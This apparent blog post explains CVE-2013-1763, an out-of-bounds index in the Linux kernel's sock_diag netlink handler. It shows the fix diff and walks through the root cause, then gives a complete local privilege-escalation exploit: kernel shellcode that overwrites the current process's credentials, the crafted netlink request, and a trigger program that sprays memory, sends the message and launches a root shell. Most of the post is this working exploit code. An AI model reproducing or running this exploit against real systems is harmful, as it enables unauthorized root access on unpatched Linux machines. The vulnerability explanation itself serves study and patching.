+++
title = "CVE-2013-1763" 
date =  "2014-04-19"
tags = ["exploit", "security", "networking"]
categories = ["Blog"]
+++

Userland can send a netlink message requesting `SOCK_DIAG_BY_FAMILY` with a family greater or equal then `AF_MAX` -- the array size of `sock_diag_handlers[]`. The current code does not test for this condition therefore is vulnerable to an out-of-bound access opening doors for a privilege escalation.

Vulnerability
--------------

```diff
diff --git a/net/core/sock_diag.c b/net/core/sock_diag.c
index 602cd63..750f44f 100644
--- a/net/core/sock_diag.c
+++ b/net/core/sock_diag.c
@@ -121,6 +121,9 @@ static int __sock_diag_rcv_msg(struct sk_buff *skb, struct nlmsghdr *nlh)
  if (nlmsg_len(nlh) < sizeof(*req))
    return -EINVAL;
 
+ if (req->sdiag_family >= AF_MAX)
+   return -EINVAL;
+
  hndl = sock_diag_lock_handler(req->sdiag_family);
  if (hndl == NULL)
    err = -ENOENT;
  else
    err = hndl->dump(skb, nlh); // hndl->dump executes !!
```


In `__sock_diag_rcv_msg` function, userland variable `req->sdiag_family` is passed uncheckly to `sock_diag_handler`, within which overflow and exploit happens.

```c
static const inline struct sock_diag_handler *sock_diag_lock_handler(int family)
{
  if (sock_diag_handlers[family] == NULL)
    request_module("net-pf-%d-proto-%d-type-%d", PF_NETLINK, NETLINK_SOCK_DIAG, family);

  mutex_lock(&sock_diag_table_mutex);
  return sock_diag_handlers[family];
}
```

Here the function returns a pointer `sock_diag_handlers + family`.

```c
struct sock_diag_handler {
  __u8 family;
  int (*dump)(struct sk_buff *skb, struct nlmsghdr *nlh);
};
hndl = sock_diag_lock_handler(req->sdiag_family);
hndl->dump(skb, nlh); //(sock_diag_handlers + family + 8) executes !!
```

All story told, here we find that finally `(sock_diag_handlers + family + 8)` executes in kernel mode. 

Exploits
---------

1. Craft a piece of shell code.
2. Calcualte the value of `family` which points `sock_diag_handlers + family + 8` to the shell code.
3. Construct a package with large `family` and set it.
4. You got it.


Shell code
-----------

1. get `current` (pointer to the current process descriptor `task_struct`)
2. Manipulate `process credentials`

```c
static long ugid;
void patch_current() {
    int i,j,k;
    char *current = *(char**)(((long)&i) & (-8192));
    long kbase = ((long)current)>>36;
    
    for (i=0; i<4000; i+=4) {
        long *p = (void *)&current[i];
        int *t = (void*) p[0];
        if ((p[0] != p[1]) || ((p[0]>>36) != kbase)) continue;
        for (j=0; j<20; j++) {
            for (k = 0; k < 8; k++)
            if (((int*)&ugid)[k%2] != t[j+k])
            goto next;
            for (i = 0; i < 8; i++)
            t[j+i] = 0;
            for (i = 0; i < 10; i++)
            t[j+9+i] = -1;
            return;
next:;
        }
    }
}
```


Crafted a package
-----------------

```c
struct {
  struct nlmsghdr nlh;
  struct unix_diag_req r;
} req;

struct nlmsghdr {
  __u32   nlmsg_len;  /* Length of message including header */
  __u16   nlmsg_type; /* Message content */
  __u16   nlmsg_flags;  /* Additional flags */
  __u32   nlmsg_seq;  /* Sequence number */
  __u32   nlmsg_pid;  /* Sending process port ID */
};

struct unix_diag_req {
  __u8  sdiag_family;
  __u8  sdiag_protocol;
  __u16 pad;
  __u32 udiag_states;
  __u32 udiag_ino;
  __u32 udiag_show;
  __u32 udiag_cookie[2];
};
```

Trigger
---------

```c
int main()
{
  long u = getuid();
  long g = getgid();
  int i, f = socket(16,3,4);
  static int n[10] = {40,0x10014,0,0,45,-1};
 
  assert(mmap((void*)(1<<12), 1<<20, 3, 0x32, 0, 0)!=-1);
 
  setresuid(u,u,u); setresgid(g,g,g);
  ugid = (g<<32)|u;
 
  memcpy(1<<12, &patch_current, 1024);
  for (i = 0; i < (1<<17); i++) ((void**)(1<<12))[i] = &patch_current;
  send(f, n, sizeof(n), 0);
  setuid(0);
  return execl("/bin/bash", "-sh", 0);
}
```

Reference
----------

All credit goes to the authors of [this][1] and [this][2] exploits.

[1]: http://www.exploit-db.com/exploits/24746/
[2]: http://www.exploit-db.com/exploits/24555/
